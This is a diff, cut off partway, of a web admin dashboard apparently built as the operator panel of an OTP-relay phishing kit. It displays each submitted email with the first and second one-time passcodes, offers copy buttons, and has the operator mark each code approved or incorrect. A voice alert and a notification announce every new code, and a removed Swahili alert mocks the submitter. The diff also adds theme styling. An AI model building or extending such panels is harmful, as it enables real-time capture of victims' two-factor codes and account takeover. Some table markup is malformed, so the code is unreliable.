@@ -23,7 +23,97 @@ body {
   background-size: 400% 400%;
   animation: gradientShift 15s ease infinite;
   color: white;
+  transition: all 0.3s ease;
 }
+
+/* LIGHT MODE */
+body.light-mode {
+  background: linear-gradient(135deg, #e0e0e0 0%, #f5f5f5 50%, #ffffff 100%);
+  color: #1a1a1a;
+  animation: none;
+}
+
+body.light-mode .glass-navbar,
+body.light-mode .stat-card,
+body.light-mode .table-container,
+body.light-mode .glass-btn {
+  background: rgba(255, 255, 255, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.8);
+  color: #1a1a1a;
+}
+
+body.light-mode .stat-icon ion-icon {
+  color: #4f46e5;
+}
+
+body.light-mode .glass-btn {
+  color: #1a1a1a;
+}
+
+body.light-mode .glass-btn:hover {
+  background: rgba(255, 255, 255, 0.9);
+}
+
+body.light-mode th,
+body.light-mode td {
+  color: #1a1a1a;
+}
+
+body.light-mode .badge-pending { background: rgba(245, 158, 11, 0.2); color: #92400e; }
+body.light-mode .badge-approved { background: rgba(16, 185, 129, 0.2); color: #065f46; }
+body.light-mode .badge-waiting { background: rgba(79, 70, 229, 0.2); color: #3730a3; }
+body.light-mode .badge-email { background: rgba(249, 115, 22, 0.2); color: #9a3412; }
+
+body.light-mode .glass-action-btn {
+  background: rgba(0, 0, 0, 0.1);
+  color: #1a1a1a;
+}
+
+body.light-mode .glass-action-btn:hover {
+  background: rgba(0, 0, 0, 0.2);
+}
+
+body.light-mode .speaking-indicator {
+  background: rgba(16, 185, 129, 0.9);
+  color: white;
+}
+
+body.light-mode .notification-toast {
+  background: rgba(255, 255, 255, 0.95);
+  color: #1a1a1a;
+  border-left: 4px solid #4f46e5;
+}
+
+/* DARK MODE ORIGINAL */
+body.dark-mode {
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #4facfe 75%, #00f2fe 100%);
+  background-size: 400% 400%;
+  animation: gradientShift 15s ease infinite;
+  color: white;
+}
+
+body.dark-mode .glass-navbar,
+body.dark-mode .stat-card,
+body.dark-mode .table-container,
+body.dark-mode .glass-btn {
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  color: white;
+}
+
+body.dark-mode .glass-btn {
+  color: white;
+}
+
+body.dark-mode .glass-btn:hover {
+  background: rgba(255, 255, 255, 0.25);
+}
+
+body.dark-mode .badge-pending { background: rgba(245, 158, 11, 0.3); color: #fef3c7; }
+body.dark-mode .badge-approved { background: rgba(16, 185, 129, 0.3); color: #d1fae5; }
+body.dark-mode .badge-waiting { background: rgba(79, 70, 229, 0.3); color: #e0e7ff; }
+body.dark-mode .badge-email { background: rgba(249, 115, 22, 0.3); color: #fed7aa; }
 
 @keyframes gradientShift {
   0% { background-position: 0% 50%; }
@@ -66,6 +156,11 @@ body {
   text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
 }
 
+body.light-mode .logo h1 {
+  color: #1a1a1a;
+  text-shadow: none;
+}
+
 .navbar-right {
   display: flex;
   gap: 12px;
@@ -86,11 +181,9 @@ body {
   align-items: center;
   gap: 8px;
   transition: all 0.3s ease;
-  color: white;
 }
 
 .glass-btn:hover {
-  background: rgba(255, 255, 255, 0.25);
   transform: translateY(-2px);
   box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
 }
@@ -109,7 +202,6 @@ body {
   background: rgba(239, 68, 68, 1);
 }
 
-/* Container */
 .container {
   max-width: 1400px;
   margin: 32px auto;
@@ -178,6 +270,15 @@ body {
   font-size: 36px;
   font-weight: 800;
   color: white;
+}
+
+body.light-mode .stat-card h3,
+body.light-mode .stat-card .number {
+  color: #1a1a1a;
+}
+
+body.light-mode .stat-card::before {
+  background: linear-gradient(90deg, rgba(79, 70, 229, 0.5), rgba(79, 70, 229, 0.9));
 }
 
 /* Glassmorphism Table */
@@ -264,6 +365,9 @@ tr:hover {
   padding: 4px 8px;
   margin-left: 8px;
   font-size: 14px;
+  border: none;
+  cursor: pointer;
+  border-radius: 6px;
 }
 
 .copy-btn:hover {
@@ -416,7 +520,7 @@ tr:hover {
   <div class="navbar-right">
     <button class="glass-btn test-voice-btn" id="testVoiceBtn">
       <ion-icon name="volume-high-outline"></ion-icon>
-      Jaribio
+      Test Voice
     </button>
     <button class="glass-btn theme-toggle" id="themeToggleBtn">
       <ion-icon name="moon-outline"></ion-icon>
@@ -491,340 +595,464 @@ tr:hover {
 </div>
 
 <script>
-  const token = localStorage.getItem('adminToken');
-  if (!token) window.location.href = '/admin/login';
+const token = localStorage.getItem('adminToken');
+if (!token) window.location.href = '/admin/login';
 
-  // ==================== SHORT SWAHILI VOICE ALERTS ====================
-  let speechEnabled = true;
-  let speechSynthesis = window.speechSynthesis;
-  let currentUtterance = null;
-  let availableVoices = [];
-  let isSpeaking = false;
-  let speechQueue = [];
+// ==================== VOICE ALERTS SYSTEM ====================
+let speechEnabled = true;
+let speechSynthesis = window.speechSynthesis;
+let currentUtterance = null;
+let availableVoices = [];
+let isSpeaking = false;
+let speechQueue = [];
 
-  function pauseAllBrowserMedia() {
-    document.querySelectorAll('audio, video').forEach(media => {
-      if (!media.paused) {
-        media.pause();
-        media.dataset.wasPlaying = 'true';
-      }
-    });
-    document.querySelectorAll('iframe').forEach(iframe => {
-      try {
-        iframe.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*');
-        iframe.dataset.wasPlaying = 'true';
-      } catch(e) {}
-    });
-  }
-
-  function resumeAllBrowserMedia() {
-    document.querySelectorAll('audio, video').forEach(media => {
-      if (media.dataset.wasPlaying === 'true') {
-        media.play().catch(e => {});
-        delete media.dataset.wasPlaying;
-      }
-    });
-    document.querySelectorAll('iframe').forEach(iframe => {
-      if (iframe.dataset.wasPlaying === 'true') {
-        try {
-          iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
-        } catch(e) {}
-        delete iframe.dataset.wasPlaying;
-      }
-    });
-  }
-
-  function loadVoices() {
-    return new Promise((resolve) => {
-      const voices = speechSynthesis.getVoices();
-      if (voices.length) {
-        availableVoices = voices;
-        resolve(voices);
-      } else {
-        speechSynthesis.addEventListener('voiceschanged', () => {
-          availableVoices = speechSynthesis.getVoices();
-          resolve(availableVoices);
-        });
-      }
-    });
-  }
-
-  function getBestVoice() {
-    const swahiliVoice = availableVoices.find(v => v.lang.startsWith('sw'));
-    if (swahiliVoice) return swahiliVoice;
-    return availableVoices.find(voice => voice.lang && voice.lang.startsWith('en'));
-  }
-
-  function processQueue() {
-    if (isSpeaking || speechQueue.length === 0) return;
-    if (!speechEnabled) {
-      speechQueue = [];
-      return;
+function pauseAllBrowserMedia() {
+  document.querySelectorAll('audio, video').forEach(media => {
+    if (!media.paused) {
+      media.pause();
+      media.dataset.wasPlaying = 'true';
     }
-    
-    isSpeaking = true;
-    const text = speechQueue.shift();
-    pauseAllBrowserMedia();
-    
-    const utterance = new SpeechSynthesisUtterance(text);
-    const voice = getBestVoice();
-    if (voice) utterance.voice = voice;
-    utterance.rate = 0.9;
-    utterance.pitch = 1.0;
-    utterance.volume = 1;
-    
-    const indicator = document.getElementById('speakingIndicator');
-    if (indicator) indicator.classList.add('show');
-    
-    utterance.onend = () => {
-      isSpeaking = false;
-      if (indicator) indicator.classList.remove('show');
-      resumeAllBrowserMedia();
-      processQueue();
-    };
-    
-    utterance.onerror = () => {
-      isSpeaking = false;
-      if (indicator) indicator.classList.remove('show');
-      resumeAllBrowserMedia();
-      processQueue();
-    };
-    
-    currentUtterance = utterance;
-    speechSynthesis.speak(utterance);
-  }
-
-  function speakText(text, immediate = false) {
-    if (!speechEnabled || !text) return;
-    if (immediate) {
-      speechQueue = [];
-      if (currentUtterance) {
-        speechSynthesis.cancel();
-        isSpeaking = false;
-        resumeAllBrowserMedia();
-      }
-    }
-    speechQueue.push(text);
-    processQueue();
-  }
-
-  // Short Swahili alerts only!
-  function announceIncoming(type, email = null) {
-    if (!speechEnabled) return;
-    let message = '';
-    if (type === 'signup') {
-      message = 'We mzee';
-    } else if (type === 'otp') {
-      message = 'Mzee unalala na huna hela';
-    }
-    speakText(message, true);
-  }
-
-  function testVoice() {
-    if (!speechEnabled) toggleTTS();
-    speakText('Jaribio', true);
-  }
-
-  function toggleTTS() {
-    speechEnabled = !speechEnabled;
-    const btn = document.getElementById('ttsToggleBtn');
-    if (speechEnabled) {
-      btn.innerHTML = '<ion-icon name="mic-outline"></ion-icon> Voice ON';
-      btn.classList.add('active');
-    } else {
-      btn.innerHTML = '<ion-icon name="mic-off-outline"></ion-icon> Voice OFF';
-      btn.classList.remove('active');
-      if (currentUtterance) {
-        speechSynthesis.cancel();
-        isSpeaking = false;
-        speechQueue = [];
-        resumeAllBrowserMedia();
-      }
-      const indicator = document.getElementById('speakingIndicator');
-      if (indicator) indicator.classList.remove('show');
-    }
-  }
-
-  function showBubble(message, elementId = null) {
-    const bubble = document.createElement('div');
-    bubble.className = 'bubble';
-    bubble.innerHTML = `<ion-icon name="notifications-outline"></ion-icon> ${message}`;
-    document.body.appendChild(bubble);
-    
-    if (elementId) {
-      const target = document.getElementById(elementId);
-      if (target) {
-        const rect = target.getBoundingClientRect();
-        bubble.style.top = `${rect.top - 40}px`;
-        bubble.style.left = `${rect.left + 20}px`;
-      }
-    }
-    setTimeout(() => bubble.remove(), 3000);
-  }
-
-  function showNotification(title, message, type) {
-    const toast = document.getElementById('notificationToast');
-    document.getElementById('notificationTitle').textContent = title;
-    document.getElementById('notificationMessage').textContent = message;
-    toast.style.display = 'block';
-    setTimeout(() => { toast.style.display = 'none'; }, 3000);
-    
-    if (type === 'signup') {
-      announceIncoming('signup');
-      showBubble('📧 New signup', 'statPendingEmail');
-    }
-    if (type === 'first-otp' || type === 'second-otp') {
-      announceIncoming('otp');
-      showBubble('🔐 New OTP received', type === 'first-otp' ? 'statPendingFirst' : 'statPendingSecond');
-    }
-  }
-
-  async function copyToClipboard(text, fieldName) {
+  });
+  document.querySelectorAll('iframe').forEach(iframe => {
     try {
-      await navigator.clipboard.writeText(text);
-      const toast = document.createElement('div');
-      toast.className = 'copy-toast';
-      toast.innerHTML = `<ion-icon name="checkmark-circle-outline"></ion-icon> Copied!`;
-      document.body.appendChild(toast);
-      setTimeout(() => toast.remove(), 2000);
-    } catch(err) {
-      console.error('Copy failed');
-    }
-  }
-
-  // ==================== USER MANAGEMENT ====================
-  async function loadUsers() {
-    try {
-      const response = await fetch('/api/admin/users', {
-        headers: { 'Authorization': `Bearer ${token}` }
-      });
-      if (response.status === 403) {
-        localStorage.removeItem('adminToken');
-        window.location.href = '/admin/login';
-        return;
-      }
-      const users = await response.json();
-      displayUsers(users);
-      updateStats(users);
-    } catch(err) {
-      console.error(err);
-    }
-  }
-
-  function updateStats(users) {
-    const pendingEmail = users.filter(u => !u.approved).length;
-    const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct).length;
-    const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct).length;
-    
-    document.getElementById('totalUsers').textContent = users.length;
-    document.getElementById('pendingEmail').textContent = pendingEmail;
-    document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
-    document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
-  }
-
-  function escapeHtml(str) {
-    if (!str) return '';
-    return str.replace(/[&<>]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      return m;
-    });
-  }
-
-  function displayUsers(users) {
-    const tbody = document.getElementById('usersTableBody');
-    if (!users.length) {
-      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px;">No users</td</tr>';
-      return;
-    }
-    
-    tbody.innerHTML = users.map(user => {
-      let statusBadge = '';
-      let actionButtons = '';
-      
-      if (!user.approved) {
-        statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
-        actionButtons = `<button class="glass-action-btn approve-email-btn" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon> Approve</button>
-                        <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
-      } 
-      else if (user.approved && user.otp && !user.otp1_correct) {
-        statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> OTP 1 Pending</span>';
-        actionButtons = `<button class="glass-action-btn approve-first-btn" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
-                        <button class="glass-action-btn incorrect-btn" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
-                        <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
-      }
-      else if (user.approved && user.otp1_correct && user.second_otp && !user.otp2_correct) {
-        statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-checkmark-outline"></ion-icon> OTP 2 Pending</span>';
-        actionButtons = `<button class="glass-action-btn approve-second-btn" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
-                        <button class="glass-action-btn incorrect-btn" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
-                        <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
-      }
-      else {
-        statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-outline"></ion-icon> Verified</span>';
-        actionButtons = `<button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
-      }
-      
-      const emailCell = `<div class="email-cell"><span>${escapeHtml(user.email)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}', 'Email')"><ion-icon name="copy-outline"></ion-icon></button></div>`;
-      const firstOtpCell = user.otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}', 'OTP')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>';
-      const secondOtpCell = user.second_otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.second_otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}', 'OTP')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>';
-      
-      return `<tr><td>${emailCell}</td><td>${firstOtpCell}</td><td>${secondOtpCell}</td><td>${statusBadge}</td><td>${actionButtons}</td></tr>`;
-    }).join('');
-  }
-
-  async function approveEmail(email) { try { await fetch('/api/admin/approve-user', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) }); loadUsers(); } catch(e) {} }
-  async function approveFirstOTP(email) { try { await fetch('/api/admin/approve-first-otp', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) }); loadUsers(); } catch(e) {} }
-  async function incorrectFirstOTP(email) { try { await fetch('/api/admin/incorrect-first-otp', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) }); loadUsers(); } catch(e) {} }
-  async function approveSecondOTP(email) { try { await fetch('/api/admin/approve-second-otp', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) }); loadUsers(); } catch(e) {} }
-  async function incorrectSecondOTP(email) { try { await fetch('/api/admin/incorrect-second-otp', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) }); loadUsers(); } catch(e) {} }
-  async function deleteUser(email) { if (!confirm(`Delete ${email}?`)) return; try { await fetch('/api/admin/delete-user', { method: 'DELETE', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) }); loadUsers(); } catch(e) {} }
-  function logout() { if (currentUtterance) speechSynthesis.cancel(); localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; }
-
-  // ==================== POLLING FOR NEW EVENTS ====================
-  let previousUsers = [];
-  async function checkForNewEvents() {
-    try {
-      const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
-      const users = await response.json();
-      if (previousUsers.length > 0) {
-        const newUsers = users.filter(u => !u.approved && !previousUsers.find(p => p.email === u.email));
-        newUsers.forEach(() => showNotification('New Signup', 'Someone signed up', 'signup'));
-        const newOTPs = users.filter(u => (u.otp && !u.otp1_correct) && !previousUsers.find(p => p.email === u.email && p.otp === u.otp));
-        newOTPs.forEach(() => showNotification('New OTP', 'OTP received', 'first-otp'));
-      }
-      previousUsers = JSON.parse(JSON.stringify(users));
+      iframe.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*');
+      iframe.dataset.wasPlaying = 'true';
     } catch(e) {}
+  });
+}
+
+function resumeAllBrowserMedia() {
+  document.querySelectorAll('audio, video').forEach(media => {
+    if (media.dataset.wasPlaying === 'true') {
+      media.play().catch(e => {});
+      delete media.dataset.wasPlaying;
+    }
+  });
+  document.querySelectorAll('iframe').forEach(iframe => {
+    if (iframe.dataset.wasPlaying === 'true') {
+      try {
+        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+      } catch(e) {}
+      delete iframe.dataset.wasPlaying;
+    }
+  });
+}
+
+function loadVoices() {
+  return new Promise((resolve) => {
+    const voices = speechSynthesis.getVoices();
+    if (voices.length) {
+      availableVoices = voices;
+      resolve(voices);
+    } else {
+      speechSynthesis.addEventListener('voiceschanged', () => {
+        availableVoices = speechSynthesis.getVoices();
+        resolve(availableVoices);
+      });
+    }
+  });
+}
+
+function getBestVoice() {
+  const preferredOrder = [
+    'Google UK English Female',
+    'Google US English Female', 
+    'Samantha',
+    'Microsoft Zira',
+    'Google UK English Male'
+  ];
+  for (const preferred of preferredOrder) {
+    const voice = availableVoices.find(v => v.name.includes(preferred));
+    if (voice) return voice;
   }
+  return availableVoices.find(voice => voice.lang && voice.lang.startsWith('en'));
+}
 
-  window.approveEmail = approveEmail;
-  window.approveFirstOTP = approveFirstOTP;
-  window.approveSecondOTP = approveSecondOTP;
-  window.incorrectFirstOTP = incorrectFirstOTP;
-  window.incorrectSecondOTP = incorrectSecondOTP;
-  window.deleteUser = deleteUser;
-  window.copyToClipboard = copyToClipboard;
+function processQueue() {
+  if (isSpeaking || speechQueue.length === 0) return;
+  if (!speechEnabled) {
+    speechQueue = [];
+    return;
+  }
+  
+  isSpeaking = true;
+  const text = speechQueue.shift();
+  pauseAllBrowserMedia();
+  
+  const utterance = new SpeechSynthesisUtterance(text);
+  const voice = getBestVoice();
+  if (voice) utterance.voice = voice;
+  utterance.rate = 0.9;
+  utterance.pitch = 1.0;
+  utterance.volume = 1;
+  
+  const indicator = document.getElementById('speakingIndicator');
+  if (indicator) indicator.classList.add('show');
+  
+  utterance.onend = () => {
+    isSpeaking = false;
+    if (indicator) indicator.classList.remove('show');
+    resumeAllBrowserMedia();
+    processQueue();
+  };
+  
+  utterance.onerror = () => {
+    isSpeaking = false;
+    if (indicator) indicator.classList.remove('show');
+    resumeAllBrowserMedia();
+    processQueue();
+  };
+  
+  currentUtterance = utterance;
+  speechSynthesis.speak(utterance);
+}
 
-  document.getElementById('testVoiceBtn').addEventListener('click', testVoice);
-  document.getElementById('ttsToggleBtn').addEventListener('click', toggleTTS);
-  document.getElementById('themeToggleBtn').addEventListener('click', () => { document.body.classList.toggle('dark-mode'); });
-  document.getElementById('logoutBtn').addEventListener('click', logout);
+function speakText(text, immediate = false) {
+  if (!speechEnabled || !text) return;
+  if (immediate) {
+    speechQueue = [];
+    if (currentUtterance) {
+      speechSynthesis.cancel();
+      isSpeaking = false;
+      resumeAllBrowserMedia();
+    }
+  }
+  speechQueue.push(text);
+  processQueue();
+}
 
-  loadVoices();
-  loadUsers();
-  setInterval(loadUsers, 3000);
-  setInterval(checkForNewEvents, 5000);
+function testVoice() {
+  if (!speechEnabled) toggleTTS();
+  speakText('Test alert', true);
+}
+
+function toggleTTS() {
+  speechEnabled = !speechEnabled;
+  const btn = document.getElementById('ttsToggleBtn');
+  if (speechEnabled) {
+    btn.innerHTML = '<ion-icon name="mic-outline"></ion-icon> Voice ON';
+    btn.classList.add('active');
+    speakText('Voice on', true);
+  } else {
+    btn.innerHTML = '<ion-icon name="mic-off-outline"></ion-icon> Voice OFF';
+    btn.classList.remove('active');
+    if (currentUtterance) {
+      speechSynthesis.cancel();
+      isSpeaking = false;
+      speechQueue = [];
+      resumeAllBrowserMedia();
+    }
+    const indicator = document.getElementById('speakingIndicator');
+    if (indicator) indicator.classList.remove('show');
+  }
+}
+
+function showBubble(message, elementId = null) {
+  const bubble = document.createElement('div');
+  bubble.className = 'bubble';
+  bubble.innerHTML = `<ion-icon name="notifications-outline"></ion-icon> ${message}`;
+  document.body.appendChild(bubble);
+  
+  if (elementId) {
+    const target = document.getElementById(elementId);
+    if (target) {
+      const rect = target.getBoundingClientRect();
+      bubble.style.top = `${rect.top - 40}px`;
+      bubble.style.left = `${rect.left + 20}px`;
+    }
+  }
+  setTimeout(() => bubble.remove(), 3000);
+}
+
+function showNotification(title, message, type) {
+  const toast = document.getElementById('notificationToast');
+  document.getElementById('notificationTitle').textContent = title;
+  document.getElementById('notificationMessage').textContent = message;
+  toast.style.display = 'block';
+  setTimeout(() => { toast.style.display = 'none'; }, 4000);
+  
+  if (Notification.permission === 'granted') {
+    new Notification(title, { body: message });
+  }
+}
+
+async function copyToClipboard(text) {
+  try {
+    await navigator.clipboard.writeText(text);
+    const toast = document.createElement('div');
+    toast.className = 'copy-toast';
+    toast.innerHTML = `<ion-icon name="checkmark-circle-outline"></ion-icon> Copied!`;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 2000);
+  } catch(err) {
+    console.error('Copy failed');
+  }
+}
+
+// ==================== THEME TOGGLE ====================
+function toggleTheme() {
+  const body = document.body;
+  const themeBtn = document.getElementById('themeToggleBtn');
+  
+  if (body.classList.contains('dark-mode')) {
+    body.classList.remove('dark-mode');
+    body.classList.add('light-mode');
+    themeBtn.innerHTML = '<ion-icon name="sunny-outline"></ion-icon> Light';
+  } else if (body.classList.contains('light-mode')) {
+    body.classList.remove('light-mode');
+    body.classList.add('dark-mode');
+    themeBtn.innerHTML = '<ion-icon name="moon-outline"></ion-icon> Dark';
+  } else {
+    body.classList.add('dark-mode');
+    themeBtn.innerHTML = '<ion-icon name="moon-outline"></ion-icon> Dark';
+  }
+}
+
+// ==================== USER MANAGEMENT ====================
+async function loadUsers() {
+  try {
+    const response = await fetch('/api/admin/users', {
+      headers: { 'Authorization': `Bearer ${token}` }
+    });
+    if (response.status === 403) {
+      localStorage.removeItem('adminToken');
+      window.location.href = '/admin/login';
+      return;
+    }
+    const users = await response.json();
+    displayUsers(users);
+    updateStats(users);
+    return users;
+  } catch(err) {
+    console.error(err);
+    return [];
+  }
+}
+
+function updateStats(users) {
+  const pendingEmail = users.filter(u => !u.approved).length;
+  const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct).length;
+  const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct).length;
+  
+  document.getElementById('totalUsers').textContent = users.length;
+  document.getElementById('pendingEmail').textContent = pendingEmail;
+  document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
+  document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return str.replace(/[&<>]/g, function(m) {
+    if (m === '&') return '&amp;';
+    if (m === '<') return '&lt;';
+    if (m === '>') return '&gt;';
+    return m;
+  });
+}
+
+function displayUsers(users) {
+  const tbody = document.getElementById('usersTableBody');
+  if (!users.length) {
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px;">No users</td</tr>';
+    return;
+  }
+  
+  tbody.innerHTML = users.map(user => {
+    let statusBadge = '';
+    let actionButtons = '';
+    
+    if (!user.approved) {
+      statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
+      actionButtons = `<button class="glass-action-btn approve-email-btn" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon> Approve</button>
+                      <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
+    } 
+    else if (user.approved && user.otp && !user.otp1_correct) {
+      statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> OTP 1 Pending</span>';
+      actionButtons = `<button class="glass-action-btn approve-first-btn" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
+                      <button class="glass-action-btn incorrect-btn" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
+                      <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
+    }
+    else if (user.approved && user.otp1_correct && user.second_otp && !user.otp2_correct) {
+      statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-checkmark-outline"></ion-icon> OTP 2 Pending</span>';
+      actionButtons = `<button class="glass-action-btn approve-second-btn" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
+                      <button class="glass-action-btn incorrect-btn" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
+                      <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
+    }
+    else {
+      statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-outline"></ion-icon> Verified</span>';
+      actionButtons = `<button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
+    }
+    
+    // PROPER TABLE RENDERING - each cell properly wrapped
+    return `<tr>
+      <td><div class="email-cell"><span>${escapeHtml(user.email)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></td>
+      <td>${user.otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td>
+      <td>${user.second_otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.second_otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td>
+      <td>${statusBadge}</td
+      <td>${actionButtons}</td
+    </tr>`;
+  }).join('');
+}
+
+async function approveEmail(email) { 
+  try { 
+    await fetch('/api/admin/approve-user', { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+  } catch(e) {} 
+}
+
+async function approveFirstOTP(email) { 
+  try { 
+    await fetch('/api/admin/approve-first-otp', { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+  } catch(e) {} 
+}
+
+async function incorrectFirstOTP(email) { 
+  try { 
+    await fetch('/api/admin/incorrect-first-otp', { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+  } catch(e) {} 
+}
+
+async function approveSecondOTP(email) { 
+  try { 
+    await fetch('/api/admin/approve-second-otp', { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+  } catch(e) {} 
+}
+
+async function incorrectSecondOTP(email) { 
+  try { 
+    await fetch('/api/admin/incorrect-second-otp', { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+  } catch(e) {} 
+}
+
+async function deleteUser(email) { 
+  if (!confirm(`Delete ${email}?`)) return; 
+  try { 
+    await fetch('/api/admin/delete-user', { 
+      method: 'DELETE', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+  } catch(e) {} 
+}
+
+function logout() { 
+  if (currentUtterance) speechSynthesis.cancel(); 
+  localStorage.removeItem('adminToken'); 
+  window.location.href = '/admin/login'; 
+}
+
+// ==================== POLLING FOR NEW EVENTS WITH VOICE ====================
+let previousUsers = [];
+let isFirstLoad = true;
+
+async function checkForNewEvents() {
+  try {
+    const response = await fetch('/api/admin/users', { 
+      headers: { 'Authorization': `Bearer ${token}` } 
+    });
+    const users = await response.json();
+    
+    if (!isFirstLoad && previousUsers.length > 0) {
+      
